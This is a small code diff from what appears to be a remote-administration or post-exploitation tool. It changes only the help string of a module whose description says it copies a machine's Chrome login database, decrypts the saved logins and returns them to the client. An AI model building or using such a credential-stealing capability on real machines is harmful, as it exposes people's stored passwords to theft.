@@ -133,7 +133,7 @@ class mod_chrome_logins(mod_interface):
                                      "server's chrome login DB. It makes a copy of the current\n"
                                      "DB and then reads the 'logins' entries, decrypts them and\n"
                                      "returns them to the client as JSON."),
-            'cmd': 'cl [-c [<db_filename>]]',
+            'cmd': f'{self.getCmdVariants4Help()} [-c [<db_filename>]]',
             'ext': self.pritify4log(
                    "-c\tDownload the chrome login DB to client. Optional: <db_filename>\n\n"
                    "Per default the module returns all 'logins' entries of the chrome\n"
